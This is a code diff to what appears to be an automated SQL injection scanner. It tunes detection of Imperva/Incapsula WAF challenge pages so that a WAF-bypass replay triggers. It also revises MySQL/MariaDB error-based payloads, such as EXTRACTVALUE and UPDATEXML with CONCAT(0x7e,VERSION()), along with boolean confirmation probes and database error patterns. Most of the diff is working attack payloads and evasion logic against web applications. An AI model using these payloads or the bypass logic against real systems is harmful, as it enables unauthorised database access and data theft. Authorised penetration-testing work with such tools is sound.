@@ -100345,6 +100345,20 @@ class WAFBlockDiscriminator:
         r"citrix\s+adc",               # Citrix ADC/NetScaler WAF
         r"myra\s+security",            # Myra Security WAF
         r"cloudfront.*error",          # CloudFront distribution error
+        # BUG-WAF-IMPERVA-MISSING-PATTERNS-FIX: White-labeled Imperva/Incapsula
+        # challenge pages served by enterprise deployments typically do NOT contain
+        # the strings "imperva" or "incapsula" in their body — those strings appear
+        # only in the canonical block page, not in JS-challenge or captcha variants.
+        # Without these patterns, is_waf_block() returns False for Imperva-protected
+        # targets whose challenge pages use only injected resource paths / cookie names,
+        # causing _check_a_all_waf_blocked to stay False → WAF-bypass replay never fires.
+        r"/_incapsula_resource",       # Imperva/Incapsula static resource path (all variants)
+        r"incapsula_ses",              # Imperva session cookie name embedded in JS
+        r"incapsula\s+incident",       # Imperva incident block page text
+        r"visid_incap",                # Imperva visitor-ID cookie name in Set-Cookie / body JS
+        r"nlbi_\d",                    # Imperva NLB instance cookie (nlbi_<id>) in body JS
+        r"_incap_ses",                 # Imperva session-token cookie name in body JS
+        r"incap_ses",                  # Imperva session cookie (alternate casing) in body JS
     ]
 
     @classmethod
@@ -109258,7 +109272,7 @@ class TechniqueCascadeEngine:
                     if not (_t_waf and _f_waf):
                         _t_st = getattr(_fp_t, 'status_code', None)
                         _f_st = getattr(_fp_f, 'status_code', None)
-                        if (_t_st in (400, 403, 406, 429) and _f_st in (400, 403, 406, 429)):
+                        if (_t_st in (400, 403, 406, 429, 503) and _f_st in (400, 403, 406, 429, 503)):  # BUG-CHECKA-503-MISSING-FIX
                             _t_waf = True
                             _f_waf = True
                     if _t_waf and _f_waf:
@@ -109490,14 +109504,11 @@ class TechniqueCascadeEngine:
                     (" AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -", "updatexml-num"),
                 ]
             else:  # MySQL and other MySQL-compatible engines
+                # BUG-MYSQL-CHECKC-DIV-DEADCODE-FIX: MySQL 1/0 evaluates to NULL (not an error).
+                # `AND 1/0` = `AND NULL` = false condition; MySQL never raises a division error
+                # for this form. Removed to avoid 2 wasted HTTP probes per Check C run.
+                # BUG-MYSQL-CHECK-C FIX: CAST('abc' AS INTEGER) silently returns 0 — removed.
                 _c_fallbacks = [
-                    ("' AND 1/0-- -", "division"),
-                    (" AND 1/0-- -", "division-num"),      # BUG-R3-D FIX
-                    # BUG-MYSQL-CHECK-C FIX: CAST('abc' AS INTEGER) in MySQL silently
-                    # returns 0 without raising any SQL error or changing the response body
-                    # — it can NEVER match any error pattern, making these entries dead code.
-                    # Replace with EXTRACTVALUE() which triggers a visible XPATH error
-                    # ("XPATH syntax error") that matches the MySQL error patterns above.
                     ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -", "extractvalue"),
                     (" AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -", "extractvalue-num"),
                     (f"' AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table"),
@@ -109630,6 +109641,16 @@ class TechniqueCascadeEngine:
                     "updatexml(",
                     "extractvalue(",
                     "division by zero",
+                    # BUG-CHECKC-MARIADB-CAST-PATTERNS-FIX: MariaDB CAST AS SIGNED/DECIMAL
+                    # canaries produce "Error 1292: Truncated incorrect INTEGER/DECIMAL value"
+                    # (strict mode) or "Warning 1292" (default mode), neither of which was in
+                    # the pattern list → those canaries could never match → 2-4 wasted probes
+                    # per Check C run and lower effective signal diversity. Added error 1292
+                    # and the truncation/incorrect-value phrasing variants.
+                    "error 1292",
+                    "truncated incorrect",
+                    "incorrect integer value",
+                    "incorrect decimal value",
                 ],
             # FIX-CHECKC-UNKNOWN-DBMS: the old fallback contained only MySQL-format patterns.
             # When dbms="" (timing-first detection fires before DBMS fingerprinting),
@@ -109782,8 +109803,17 @@ class TechniqueCascadeEngine:
                     "MySQL": ["you have an error in your sql syntax","check the manual that corresponds to your mysql server version",
                               "warning: mysql_","error 1064","sqlstate[","xpath syntax error","extractvalue error","updatexml error",
                               "mysql_fetch_","supplied argument is not a valid mysql"],
+                    # BUG-ETYPE-FASTPATH-MARIADB-XPATH-FIX: MariaDB EXTRACTVALUE()/UPDATEXML()
+                    # produce "XPATH syntax error: '~<version>'" — identical to MySQL behaviour.
+                    # "xpath syntax error", "extractvalue(", "updatexml(" were absent from the
+                    # MariaDB list while the identical E/EH canary payloads that generate them
+                    # ARE used. Result: E-technique fast path always fell through to Check A/C
+                    # for MariaDB error-based injection, adding 6+ extra HTTP probes and losing
+                    # the zero-probe fast confirmation path entirely. Fix: mirror MySQL's xpath/
+                    # extractvalue/updatexml patterns in the MariaDB list.
                     "MariaDB": ["you have an error in your sql syntax","check the manual that corresponds to your mariadb server version",
-                                "mariadb server version","error 1064","sqlstate["],
+                                "mariadb server version","error 1064","sqlstate[",
+                                "xpath syntax error","extractvalue(","updatexml("],
                     "PostgreSQL": ["error:  division by zero","error:  invalid input syntax","error:  syntax error at or near",
                                    "error:  relation","error:  column","division by zero","syntax error at or near",
                                    "invalid input syntax for type","pg_query()","npgsql.",
@@ -110335,10 +110365,18 @@ class TechniqueCascadeEngine:
                 # adds a leading "'" which creates a syntax error for both the DBMS-SQL
                 # probe and the detection probe → diff ≈ 0 → Check E always fails.
                 # Numeric variants use the same SQL logic without the leading quote.
+                # BUG-CHECKE-BENCHMARK-FALSE-CONDITION-FIX: BENCHMARK(n,expr) always
+                # returns 0 in MySQL/MariaDB (documented: "BENCHMARK() always returns 0").
+                # AND BENCHMARK(...) == AND 0 == FALSE → the entire Check E probe
+                # evaluates to the FALSE-condition page, not the TRUE-condition page.
+                # _e_direct_sim compares this FALSE response to the detection's TRUE
+                # response → low similarity → Check E ALWAYS fails for genuine MySQL
+                # injection. Fixed: use CHAR(83)=SUBSTRING(...) and 83=ASCII('S')
+                # which are all-TRUE conditions using only native MySQL string functions.
                 if numeric_ctx:
                     payloads = {
-                        "MySQL":      " AND BENCHMARK(1,MD5(CHAR(65))) AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9-- -",
-                        "MariaDB":    " AND BENCHMARK(1,MD5(CHAR(65))) AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9-- -",
+                        "MySQL":      " AND CHAR(83)=SUBSTRING('SQLReaper',1,1) AND LENGTH('SQLReaper')=9 AND 83=ASCII('S')-- -",
+                        "MariaDB":    " AND CHAR(83)=SUBSTRING('SQLReaper',1,1) AND LENGTH('SQLReaper')=9 AND 83=ASCII('S')-- -",
                         "PostgreSQL": " AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "MSSQL":      " AND SUBSTRING('SQLReaper',1,1)='S' AND LEN('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "Oracle":     " AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
@@ -110346,8 +110384,8 @@ class TechniqueCascadeEngine:
                     }
                 else:
                     payloads = {
-                        "MySQL":      "' AND BENCHMARK(1,MD5(CHAR(65))) AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9-- -",
-                        "MariaDB":    "' AND BENCHMARK(1,MD5(CHAR(65))) AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9-- -",
+                        "MySQL":      "' AND CHAR(83)=SUBSTRING('SQLReaper',1,1) AND LENGTH('SQLReaper')=9 AND 83=ASCII('S')-- -",
+                        "MariaDB":    "' AND CHAR(83)=SUBSTRING('SQLReaper',1,1) AND LENGTH('SQLReaper')=9 AND 83=ASCII('S')-- -",
                         "PostgreSQL": "' AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "MSSQL":      "' AND SUBSTRING('SQLReaper',1,1)='S' AND LEN('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "Oracle":     "' AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
